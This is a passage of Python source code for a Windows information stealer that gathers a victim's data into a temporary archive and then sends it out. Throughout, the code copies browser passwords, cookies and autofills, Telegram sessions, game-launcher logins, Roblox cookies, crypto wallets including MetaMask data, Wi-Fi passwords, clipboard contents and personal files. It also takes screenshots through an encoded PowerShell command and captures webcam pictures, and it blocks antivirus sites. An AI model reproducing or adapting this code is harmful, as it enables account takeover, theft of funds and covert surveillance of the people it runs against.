            self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
            if not os.path.isfile(self.ArchivePath):
                break
        Logger.info('Creating temporary folder')
        while True:
            self.TempFolder = os.path.join(os.getenv('temp'), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok=True)
                break
        for func, daemon in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealGrowtopia, False), (self.StealSteam, False), (self.StealUplay, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.BlockSites, False), (self.TakeScreenshot, True), (self.Webshot, True), (self.StealCommonFiles, True)):
            thread = Thread(target=func, daemon=daemon)
            thread.start()
            Tasks.AddTask(thread)
        Tasks.WaitForAll()
        Logger.info('All functions ended')
        if Errors.errors:
            with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                file.write('# This file contains the errors handled successfully during the functioning of the stealer.' + '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
        self.SendData()
        try:
            Logger.info('Removing archive')
            os.remove(self.ArchivePath)
            Logger.info('Removing temporary folder')
            shutil.rmtree(self.TempFolder)
        except Exception:
            pass

    @Errors.Catch
    def StealCommonFiles(self) -> None:
        if Settings.CaptureCommonFiles:
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    file: str
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)):
                            if (any([x in file.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))) and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024:
                                try:
                                    os.makedirs(os.path.join(self.TempFolder, 'Common Files', name), exist_ok=True)
                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, 'Common Files', name, file))
                                    self.CommonFilesCount += 1
                                except Exception:
                                    pass

    @Errors.Catch
    def StealMinecraft(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Minecraft related files')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Minecraft')
            userProfile = os.getenv('userprofile')
            roaming = os.getenv('appdata')
            minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'), 'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
            for name, path in minecraftPaths.items():
                if os.path.isfile(path):
                    try:
                        os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                        shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                        self.MinecraftSessions += 1
                    except Exception:
                        continue

    @Errors.Catch
    def StealGrowtopia(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Growtopia session')
            growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Growtopia')] if x is not None])]
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Growtopia')
            multiple = len(growtopiadirs) > 1
            for index, path in enumerate(growtopiadirs):
                targetFilePath = os.path.join(path, 'save.dat')
                if os.path.isfile(targetFilePath):
                    try:
                        _saveToPath = saveToPath
                        if multiple:
                            _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                        os.makedirs(_saveToPath, exist_ok=True)
                        shutil.copy(targetFilePath, os.path.join(_saveToPath, 'save.dat'))
                        self.GrowtopiaStolen = True
                    except Exception:
                        shutil.rmtree(_saveToPath)
            if multiple and self.GrowtopiaStolen:
                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                    file.write('Multiple Growtopia installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealEpic(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Epic session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
            epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if '[RememberMe]' in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                            self.EpicStolen = True
                        except Exception:
                            pass

    @Errors.Catch
    def StealSteam(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Steam session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
            steamPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Steam')] if x is not None])]
            multiple = len(steamPaths) > 1
            if not steamPaths:
                steamPaths.append('C:\\Program Files (x86)\\Steam')
            for index, steamPath in enumerate(steamPaths):
                steamConfigPath = os.path.join(steamPath, 'config')
                if os.path.isdir(steamConfigPath):
                    loginFile = os.path.join(steamConfigPath, 'loginusers.vdf')
                    if os.path.isfile(loginFile):
                        with open(loginFile) as file:
                            contents = file.read()
                        if '"RememberPassword"\t\t"1"' in contents:
                            try:
                                _saveToPath = saveToPath
                                if multiple:
                                    _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                                os.makedirs(_saveToPath, exist_ok=True)
                                shutil.copytree(steamConfigPath, os.path.join(_saveToPath, 'config'), dirs_exist_ok=True)
                                for item in os.listdir(steamPath):
                                    if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
                                        shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
                                        self.SteamStolen = True
                            except Exception:
                                pass
            if self.SteamStolen and multiple:
                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                    file.write('Multiple Steam installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealUplay(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Uplay session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
            uplayPath = os.path.join(os.getenv('localappdata'), 'Ubisoft Game Launcher')
            if os.path.isdir(uplayPath):
                for item in os.listdir(uplayPath):
                    if os.path.isfile(os.path.join(uplayPath, item)):
                        os.makedirs(saveToPath, exist_ok=True)
                        shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                        self.UplayStolen = True

    @Errors.Catch
    def StealRobloxCookies(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Roblox cookies')
            saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
            note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
            cookies = []
            browserCookies = '\n'.join(self.Cookies)
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
                cookies.append(match)
            output = list()
            for item in ('HKCU', 'HKLM'):
                process = subprocess.run('powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
                if not process.returncode:
                    output.append(process.stdout.decode(errors='ignore'))
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
                cookies.append(match)
            cookies = [*set(cookies)]
            if cookies:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
                    file.write('{}{}{}'.format(note, self.Separator, self.Separator.join(cookies)))
                self.RobloxCookiesCount += len(cookies)

    @Errors.Catch
    def StealWallets(self) -> None:
        if Settings.CaptureWallets:
            Logger.info('Stealing crypto wallets')
            saveToDir = os.path.join(self.TempFolder, 'Wallets')
            wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
            browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
            for name, path in wallets:
                if os.path.isdir(path):
                    _saveToDir = os.path.join(saveToDir, name)
                    os.makedirs(_saveToDir, exist_ok=True)
                    try:
                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                        with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                            file.write(path)
                        self.WalletsCount += 1
                    except Exception:
                        try:
                            shutil.rmtree(_saveToDir)
                        except Exception:
                            pass
            for name, path in browserPaths.items():
                if os.path.isdir(path):
                    for root, dirs, _ in os.walk(path):
                        for _dir in dirs:
                            if _dir == 'Local Extension Settings':
                                localExtensionsSettingsDir = os.path.join(root, _dir)
                                for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                    extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
                                    if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                        try:
                                            metamask_browser = os.path.join(saveToDir, 'Metamask ({})'.format(name))
                                            _saveToDir = os.path.join(metamask_browser, _dir)
                                            shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok=True)
                                            with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                                file.write(extentionPath)
                                            self.WalletsCount += 1
                                        except Exception:
                                            try:
                                                shutil.rmtree(_saveToDir)
                                                if not os.listdir(metamask_browser):
                                                    shutil.rmtree(metamask_browser)
                                            except Exception:
                                                pass

    @Errors.Catch
    def StealSystemInfo(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Stealing system information')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('systeminfo', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
                    file.write(output)
                self.SystemInfoStolen = True
            process = subprocess.run('getmac', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'MAC Addresses.txt'), 'w') as file:
                    file.write(output)
                self.SystemInfoStolen = True

    @Errors.Catch
    def GetDirectoryTree(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting directory trees')
            PIPE = chr(9474) + '   '
            TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
            ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
            output = {}
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    dircontent: list = os.listdir(dir)
                    if 'desltop.ini' in dircontent:
                        dircontent.remove('desktop.ini')
                    if dircontent:
                        process = subprocess.run('tree /A /F', shell=True, capture_output=True, cwd=dir)
                        if process.returncode == 0:
                            output[name] = (name + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
            for key, value in output.items():
                os.makedirs(os.path.join(self.TempFolder, 'Directories'), exist_ok=True)
                with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
                    file.write(value)
                self.SystemInfoStolen = True

    @Errors.Catch
    def GetClipboard(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting clipboard text')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('powershell Get-Clipboard', shell=True, capture_output=True)
            if process.returncode == 0:
                content = process.stdout.decode(errors='ignore').strip()
                if content:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
                        file.write(content)

    @Errors.Catch
    def GetAntivirus(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting antivirus')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n').splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write('\n'.join(output))

    @Errors.Catch
    def GetTaskList(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting task list')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('tasklist /FO LIST', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
                    tasklist.write(output)

    @Errors.Catch
    def GetWifiPasswords(self) -> None:
        if Settings.CaptureWifiPasswords:
            Logger.info('Getting wifi passwords')
            saveToDir = os.path.join(self.TempFolder, 'System')
            passwords = Utility.GetWifiPasswords()
            profiles = list()
            for profile, psw in passwords.items():
                profiles.append(f'Network: {profile}\nPassword: {psw}')
            if profiles:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(profiles))
                self.WifiPasswordsCount += len(profiles)

    @Errors.Catch
    def TakeScreenshot(self) -> None:
        if Settings.CaptureScreenshot:
            Logger.info('Taking screenshot')
            command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
            if subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command], shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
                self.ScreenshotTaken = True

    @Errors.Catch
    def BlockSites(self) -> None:
        if Settings.BlockAvSites:
            Logger.info('Blocking AV sites')
            Utility.BlockSites()
            Utility.TaskKill('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore')

    @Errors.Catch
    def StealBrowserData(self) -> None:
        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
            return
        Logger.info('Stealing browser data')
        threads: list[Thread] = []
        paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'epic'), 'Iridium': (os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'iridium'), 'Opera': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'opera'), 'Opera GX': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'operagx'), 'Slimjet': (os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'slimjet'), 'UR': (os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'urbrowser'), 'Vivaldi': (os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'vivaldi'), 'Yandex': (os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data'), 'yandex')}
        for name, item in paths.items():
            path, procname = item
            if os.path.isdir(path):

                def run(name, path):
                    try:
                        Utility.TaskKill(procname)
                        browser = Browsers.Chromium(path)
                        saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
                        history = browser.GetHistory() if Settings.CaptureHistory else None
                        autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
                        if passwords or cookies or history or autofills:
                            os.makedirs(saveToDir, exist_ok=True)
                            if passwords:
                                output = ['URL: {}\nUsername: {}\nPassword: {}'.format(*x) for x in passwords]
                                with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.PasswordsCount += len(passwords)
                            if cookies:
                                output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(not host.startswith('.')).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write('\n'.join(output))
                                self.Cookies.extend([str(x[3]) for x in cookies])
                            if history:
                                output = ['URL: {}\nTitle: {}\nVisits: {}'.format(*x) for x in history]
                                with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.HistoryCount += len(history)
                            if autofills:
                                output = '\n'.join(autofills)
                                with open(os.path.join(saveToDir, '{} Autofills.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(output)
                                self.AutofillCount += len(autofills)
                    except Exception:
                        pass
                t = Thread(target=run, args=(name, path))
                t.start()
                threads.append(t)
        for thread in threads:
            thread.join()
        if Settings.CaptureGames:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self) -> None:
        if Settings.CaptureWebcam:
            camdir = os.path.join(self.TempFolder, 'Webcam')
            os.makedirs(camdir, exist_ok=True)
            camIndex = 0
            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))):
                camIndex += 1
                self.WebcamPicturesCount += 1
            if self.WebcamPicturesCount == 0:
                shutil.rmtree(camdir)

    @Errors.Catch
    def StealTelegramSessions(self) -> None:
        if Settings.CaptureTelegram:
            Logger.info('Stealing telegram sessions')
            telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Telegram')] if x is not None])]
            multiple = len(telegramPaths) > 1
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Telegram')
            if not telegramPaths:
                telegramPaths.append(os.path.join(os.getenv('appdata'), 'Telegram Desktop'))
            for index, telegramPath in enumerate(telegramPaths):
                tDataPath = os.path.join(telegramPath, 'tdata')
                loginPaths = []
                files = []
                dirs = []
                has_key_datas = False
                if os.path.isdir(tDataPath):
                    for item in os.listdir(tDataPath):
                        itempath = os.path.join(tDataPath, item)
                        if item == 'key_datas':
                            has_key_datas = True
                            loginPaths.append(itempath)
                        if os.path.isfile(itempath):
                            files.append(item)
                        else:
                            dirs.append(item)
                    for filename in files:
                        for dirname in dirs:
                            if dirname + 's' == filename:
                                loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
                if has_key_datas and len(loginPaths) - 1 > 0:
                    _saveToDir = saveToDir
                    if multiple:
                        _saveToDir = os.path.join(_saveToDir, 'Profile %d' % (index + 1))
